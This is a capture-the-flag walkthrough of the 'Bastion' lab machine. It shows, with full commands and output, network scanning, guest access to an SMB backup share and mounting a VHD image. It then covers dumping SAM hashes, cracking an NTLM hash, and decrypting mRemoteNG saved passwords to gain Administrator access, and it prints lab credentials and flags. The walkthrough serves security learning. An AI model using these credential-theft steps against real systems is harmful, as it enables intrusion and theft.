
![[Pasted_image_20210714213410.png]]

IP = "10.10.10.134"

Simple nmap tcp script to start off:
```bash
% sudo nmap -p- --min-rate 10000 -v -oA logs/tcp-simple $IP -Pn -vv       

[...redacted...]

Completed SYN Stealth Scan at 21:34, 26.09s elapsed (65535 total ports)
Nmap scan report for 10.10.10.134
Host is up, received user-set (0.068s latency).
Scanned at 2021-07-14 21:33:55 AEST for 26s
Not shown: 65522 closed ports
Reason: 65522 resets
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.28 seconds
           Raw packets sent: 66620 (2.931MB) | Rcvd: 66304 (2.652MB)

```

Acquiring service details of identified ports:
```bash
nmap -p `cat logs/tcp-simple.nmap | grep open | cut -d/ -f1 | tr "\n" "," | sed "s/,$//"` -sC -sV -Pn -oA logs/nmap-tcpscripts $IP


Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 21:38 AEST
Nmap scan report for 10.10.10.134
Host is up (0.014s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -38m07s, deviation: 1h09m14s, median: 1m50s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-14T13:41:38+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-14T11:41:39
|_  start_date: 2021-07-14T04:38:58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.63 seconds
```

Anonymous login on smb:
```bash
% smbclient -L \\\\$IP\\
Enter WORKGROUP\lo's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
```

Access denied as Guest to `C$` and `ADMIN$`:
```
% smbclient \\\\$IP\\C$
Enter WORKGROUP\lo's password:
tree connect failed: NT_STATUS_ACCESS_DENIED
[1] % smbclient \\\\$IP\\ADMIN$
Enter WORKGROUP\lo's password:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Backups share looks interesting. Decided to download everything from it:
```bash
% smbclient \\\\$IP\\Backups
Enter WORKGROUP\lo's password:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *
getting file \note.txt of size 116 as note.txt (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
getting file \SDT65CB.tmp of size 0 as SDT65CB.tmp (0.0 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \WindowsImageBackup\L4mpje-PC\MediaId of size 16 as WindowsImageBackup/L4mpje-PC/MediaId (0.2 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd of size 37761024 as WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd (5128.1 KiloBytes/sec) (average 5021.9 KiloBytes/sec)
^X@s    ^X@s

parallel_read returned NT_STATUS_DISK_FULL
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\BackupSpecs.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
NT_STATUS_CONNECTION_DISCONNECTED listing \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\*
NT_STATUS_CONNECTION_DISCONNECTED listing \WindowsImageBackup\L4mpje-PC\Catalog\*
NT_STATUS_CONNECTION_DISCONNECTED listing \WindowsImageBackup\L4mpje-PC\SPPMetadataCache\*
```

I ran out of space in the process.... The `vhd` files look a lot more interesting as they probably contain user files which might have credentials, ssh keys or else.

_Note: Virtual Hard Disk (VHD) format is a publicly-available image format [specification](http://go.microsoft.com/fwlink/p/?linkid=137171) that allows encapsulation of the hard disk into an individual file for use by the operating system as a _virtual disk_ in all the same ways physical hard disks are used. Ref: https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/dd323654(v=vs.85)_

2 vhd files were available on the share:

```bash
% ls -alh *.vhd
-rw-r--r-- 1 lo lo  37M Jul 14 23:12 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
-rw-r--r-- 1 lo lo 5.1G Jul 14 23:30 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

After downloading it we can mount the vhd:
```
guestmount --add 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd1
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd2
```

The vhd1 fails to mount but the second vhd mounts successfully:
```bash
root@kali:/mnt/vhd2# ls -al
total 2096745
drwxrwxrwx 1 root root      12288 Feb 22  2019  .
drwxr-xr-x 3 root root       4096 Jul 14 23:35  ..
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 11  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 11  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 14  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 12  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
```

Windows stores hashes in SAM and SYSTEM files which are located under `C:\Windows\System32\config`:

```bash
kali# cd /mnt/vhd2/Windows/System32/config

kali# secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

We save the hashes to hashes.txt and run hashcat to crack it:
```bash
% hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  

[...redacted...]

31d6cfe0d16ae931b73c59d7e0c089c0:
26112010952d963c8dc4217daec986d9:bureaulampje


[...redacted...]

```

We now have credentials and can verify they are working using smb:
```bash
% crackmapexec smb $IP -u "L4mpje" -p "bureaulampje" --users
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\L4mpje:bureaulampje
```

We SSH using the credentials:
```
[130] % ssh L4mpje@$IP
The authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.
ECDSA key fingerprint is SHA256:ILc1g9UC/7j/5b+vXeQ7TIaXLFddAbttU86ZeiM/bNY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.134' (ECDSA) to the list of known hosts.
L4mpje@10.10.10.134's password:
X11 forwarding request failed on channel 1
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>

```

User.txt:
```
PS C:\Users\L4mpje\Desktop> cat .\user.txt
9bfe57d5c3309db3a151772f9d86c6cd
```


Once logged in to the user, we run winpeas however nothing obvious comes up.

By looking at AppData we find that `mRemoteNG` is installed on the machine.
```
PS C:\Users\L4mpje\AppData\Local> ls


    Directory: C:\Users\L4mpje\AppData\Local


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        22-2-2019     13:50                ConnectedDevicesPlatform
d-----        22-2-2019     14:03                Microsoft
d-----        22-2-2019     13:58                Microsoft_Corporation
d-----        22-2-2019     14:01                mRemoteNG
d-----        22-2-2019     13:52                Packages
d-----        31-7-2021     12:37                Temp
d-----        22-2-2019     13:50                TileDataLayer
d-----        22-2-2019     13:50                VirtualStore
```

By navigating to `C:\Users\L4mpje\AppData\Roaming\mRemoteNG` we find xml configuration files:
```
PS C:\Users\L4mpje\AppData\Roaming\mRemoteNG> ls


    Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNG


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        22-2-2019     14:01                Themes
-a----        22-2-2019     14:03           6316 confCons.xml
-a----        22-2-2019     14:02           6194 confCons.xml.20190222-1402277353.backup
-a----        22-2-2019     14:02           6206 confCons.xml.20190222-1402339071.backup
-a----        22-2-2019     14:02           6218 confCons.xml.20190222-1402379227.backup
-a----        22-2-2019     14:02           6231 confCons.xml.20190222-1403070644.backup
-a----        22-2-2019     14:03           6319 confCons.xml.20190222-1403100488.backup
-a----        22-2-2019     14:03           6318 confCons.xml.20190222-1403220026.backup
-a----        22-2-2019     14:03           6315 confCons.xml.20190222-1403261268.backup
-a----        22-2-2019     14:03           6316 confCons.xml.20190222-1403272831.backup
-a----        22-2-2019     14:03           6315 confCons.xml.20190222-1403433299.backup
-a----        22-2-2019     14:03           6316 confCons.xml.20190222-1403486580.backup
-a----        22-2-2019     14:03             51 extApps.xml
-a----        22-2-2019     14:03           5217 mRemoteNG.log
-a----        22-2-2019     14:03           2245 pnlLayout.xml
```

The config file appears to contain base64 encoded credentials:
```
% cat asdf.txt | grep Password
Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQ
ProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect"
RDGatewayPassword="" RDGatew
eritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false"
roxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false"
lse" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false"
Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"
Username="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect"
RDGatewayPassword="" RDGatewayDom
con="false" InheritPanel="false" InheritPassword="false" InheritPort="false"
sername="false" InheritVNCProxyPassword="false" InheritVNCColors="false"
InheritRDGatewayUsername="false" InheritRDGatewayPassword="false"
```

However, attempting to decode the credentials does not return a valid password:
```
% echo "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" | base64 -d
VaQt.ޙY`5Z(#ޠ-
```

After some research, I found that this config file can be decrypted to retrieved the password stored in them. Found a script which is able to decrypt that password:
https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py

```
% python mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
```

Login to Administrator via ssh:
```
% ssh Administrator@$IP
Administrator@10.10.10.134's password:
X11 forwarding request failed on channel 1
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>
administrator@BASTION C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        23-2-2019     09:40                Contacts
d-r---        23-2-2019     09:40                Desktop
d-r---        23-2-2019     09:40                Documents
d-r---        23-2-2019     09:40                Downloads
d-r---        23-2-2019     09:40                Favorites
d-r---        23-2-2019     09:40                Links
d-r---        23-2-2019     09:40                Music
d-r---        23-2-2019     09:40                Pictures
d-r---        23-2-2019     09:40                Saved Games
d-r---        23-2-2019     09:40                Searches
d-r---        23-2-2019     09:40                Videos


PS C:\Users\Administrator> cd .\Desktop\
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        23-2-2019     09:07             32 root.txt


PS C:\Users\Administrator\Desktop> cat .\root.txt
958850b91811676ed6620a9c430e65c8
```

